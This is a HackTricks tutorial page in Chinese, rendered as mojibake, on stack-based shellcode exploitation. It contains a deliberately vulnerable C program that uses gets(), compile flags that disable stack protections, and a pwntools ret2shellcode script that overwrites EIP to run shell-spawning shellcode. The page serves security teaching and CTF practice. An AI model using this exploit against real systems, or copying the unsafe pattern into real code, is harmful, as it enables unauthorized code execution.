# æ ˆ Shellcode

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** ä¸Šå…³æ³¨æˆ‘ä»¬**ã€‚
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

**æ ˆ Shellcode** æ˜¯ä¸€ç§åœ¨**äºŒè¿›åˆ¶åˆ©ç”¨**ä¸­ä½¿ç”¨çš„æŠ€æœ¯ï¼Œé»‘å®¢å°† shellcode å†™å…¥ä¸€ä¸ªæ˜“å—æ”»å‡»ç¨‹åºçš„æ ˆä¸­ï¼Œç„¶åä¿®æ”¹**æŒ‡ä»¤æŒ‡é’ˆï¼ˆIPï¼‰**æˆ–**æ‰©å±•æŒ‡ä»¤æŒ‡é’ˆï¼ˆEIPï¼‰**ï¼Œä½¿å…¶æŒ‡å‘è¯¥ shellcode çš„ä½ç½®ï¼Œä»è€Œæ‰§è¡Œè¯¥ shellcodeã€‚è¿™æ˜¯ä¸€ç§ç»å…¸æ–¹æ³•ï¼Œç”¨äºåœ¨ç›®æ ‡ç³»ç»Ÿä¸Šè·å–æœªç»æˆæƒçš„è®¿é—®æƒé™æˆ–æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ä»¥ä¸‹æ˜¯è¯¥è¿‡ç¨‹çš„è¯¦ç»†è¯´æ˜ï¼ŒåŒ…æ‹¬ä¸€ä¸ªç®€å•çš„ C ç¤ºä¾‹ä»¥åŠå¦‚ä½•ä½¿ç”¨ Python å’Œ**pwntools**ç¼–å†™ç›¸åº”çš„åˆ©ç”¨ç¨‹åºã€‚

### C ç¤ºä¾‹ï¼šä¸€ä¸ªæ˜“å—æ”»å‡»çš„ç¨‹åº

è®©æˆ‘ä»¬ä»ä¸€ä¸ªæ˜“å—æ”»å‡»çš„ C ç¨‹åºçš„ç®€å•ç¤ºä¾‹å¼€å§‹ï¼š
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function() {
char buffer[64];
gets(buffer); // Unsafe function that does not check for buffer overflow
}

int main() {
vulnerable_function();
printf("Returned safely\n");
return 0;
}
```
è¿™ä¸ªç¨‹åºç”±äºä½¿ç”¨äº†`gets()`å‡½æ•°è€Œå®¹æ˜“å—åˆ°ç¼“å†²åŒºæº¢å‡ºçš„å½±å“ã€‚

### ç¼–è¯‘

è¦ç¼–è¯‘æ­¤ç¨‹åºå¹¶ç¦ç”¨å„ç§ä¿æŠ¤æªæ–½ï¼ˆä»¥æ¨¡æ‹Ÿä¸€ä¸ªæœ‰æ¼æ´çš„ç¯å¢ƒï¼‰ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
* `-fno-stack-protector`: ç¦ç”¨å †æ ˆä¿æŠ¤ã€‚
* `-z execstack`: ä½¿å †æ ˆå¯æ‰§è¡Œï¼Œè¿™å¯¹äºåœ¨å †æ ˆä¸Šæ‰§è¡Œå­˜å‚¨çš„ shellcode æ˜¯å¿…è¦çš„ã€‚
* `-no-pie`: ç¦ç”¨ä½ç½®æ— å…³å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä½¿å¾—æ›´å®¹æ˜“é¢„æµ‹ shellcode å°†ä½äºçš„å†…å­˜åœ°å€ã€‚
* `-m32`: å°†ç¨‹åºç¼–è¯‘ä¸º 32 ä½å¯æ‰§è¡Œæ–‡ä»¶ï¼Œé€šå¸¸ç”¨äºç®€åŒ–åˆ©ç”¨å¼€å‘ã€‚

### ä½¿ç”¨ Pwntools çš„ Python Exploit

ä»¥ä¸‹æ˜¯å¦‚ä½•ä½¿ç”¨ **pwntools** ç¼–å†™ Python æ”»å‡»æ¥æ‰§è¡Œ **ret2shellcode** æ”»å‡»ï¼š
```python
from pwn import *

# Set up the process and context
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path
context.arch = 'i386' # Specify the architecture

# Generate the shellcode
shellcode = asm(shellcraft.sh()) # Using pwntools to generate shellcode for opening a shell

# Find the offset to EIP
offset = cyclic_find(0x6161616c) # Assuming 0x6161616c is the value found in EIP after a crash

# Prepare the payload
# The NOP slide helps to ensure that the execution flow hits the shellcode.
nop_slide = asm('nop') * (offset - len(shellcode))
payload = nop_slide + shellcode
payload += b'A' * (offset - len(payload))  # Adjust the payload size to exactly fill the buffer and overwrite EIP
payload += p32(0xffffcfb4) # Supossing 0xffffcfb4 will be inside NOP slide

# Send the payload
p.sendline(payload)
p.interactive()
```
è¿™ä¸ªè„šæœ¬æ„é€ äº†ä¸€ä¸ªç”±**NOPæ»‘åŠ¨**ã€**shellcode**ç»„æˆçš„æœ‰æ•ˆè½½è·ï¼Œç„¶åç”¨æŒ‡å‘NOPæ»‘åŠ¨çš„åœ°å€è¦†ç›–**EIP**ï¼Œç¡®ä¿shellcodeè¢«æ‰§è¡Œã€‚

**NOPæ»‘åŠ¨**(`asm('nop')`)ç”¨äºå¢åŠ æ‰§è¡Œ"æ»‘åŠ¨"åˆ°æˆ‘ä»¬çš„shellcodeçš„æœºä¼šï¼Œæ— è®ºç¡®åˆ‡åœ°å€æ˜¯ä»€ä¹ˆã€‚è°ƒæ•´`p32()`å‚æ•°ä¸ºç¼“å†²åŒºèµ·å§‹åœ°å€åŠ ä¸Šä¸€ä¸ªåç§»é‡ï¼Œä»¥è½å…¥NOPæ»‘åŠ¨ä¸­ã€‚

## ä¿æŠ¤æªæ–½

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/) åº”è¯¥è¢«ç¦ç”¨ï¼Œä»¥ç¡®ä¿åœ°å€åœ¨å¤šæ¬¡æ‰§è¡Œä¸­å¯é ï¼Œå¦åˆ™å‡½æ•°å­˜å‚¨çš„åœ°å€ä¸ä¼šå§‹ç»ˆç›¸åŒï¼Œä½ éœ€è¦ä¸€äº›æ³„æ¼æ¥æ‰¾å‡ºwinå‡½æ•°åŠ è½½çš„ä½ç½®ã€‚
* [**æ ˆä¿æŠ¤**](../common-binary-protections-and-bypasses/stack-canaries/)ä¹Ÿåº”è¯¥è¢«ç¦ç”¨ï¼Œå¦åˆ™å—æŸçš„EIPè¿”å›åœ°å€å°†æ°¸è¿œä¸ä¼šè¢«è·Ÿéšã€‚
* [**NX**](../common-binary-protections-and-bypasses/no-exec-nx.md) **æ ˆ**ä¿æŠ¤ä¼šé˜»æ­¢åœ¨æ ˆå†…æ‰§è¡Œshellcodeï¼Œå› ä¸ºè¯¥åŒºåŸŸä¸å¯æ‰§è¡Œã€‚

## å…¶ä»–ç¤ºä¾‹å’Œå‚è€ƒèµ„æ–™

* [https://ir0nstone.gitbook.io/notes/types/stack/shellcode](https://ir0nstone.gitbook.io/notes/types/stack/shellcode)
* [https://guyinatuxedo.github.io/06-bof\_shellcode/csaw17\_pilot/index.html](https://guyinatuxedo.github.io/06-bof\_shellcode/csaw17\_pilot/index.html)
* 64ä½ï¼Œå¸¦æœ‰æ ˆåœ°å€æ³„æ¼çš„ASLRï¼Œç¼–å†™shellcodeå¹¶è·³è½¬åˆ°å®ƒ
* [https://guyinatuxedo.github.io/06-bof\_shellcode/tamu19\_pwn3/index.html](https://guyinatuxedo.github.io/06-bof\_shellcode/tamu19\_pwn3/index.html)
* 32ä½ï¼Œå¸¦æœ‰æ ˆæ³„æ¼çš„ASLRï¼Œç¼–å†™shellcodeå¹¶è·³è½¬åˆ°å®ƒ
* [https://guyinatuxedo.github.io/06-bof\_shellcode/tu18\_shellaeasy/index.html](https://guyinatuxedo.github.io/06-bof\_shellcode/tu18\_shellaeasy/index.html)
* 32ä½ï¼Œå¸¦æœ‰æ ˆæ³„æ¼çš„ASLRï¼Œæ¯”è¾ƒä»¥é˜²æ­¢è°ƒç”¨exit()ï¼Œç”¨å€¼è¦†ç›–å˜é‡ï¼Œç¼–å†™shellcodeå¹¶è·³è½¬åˆ°å®ƒ

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ä¸Šå…³æ³¨**æˆ‘ä»¬ã€‚
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
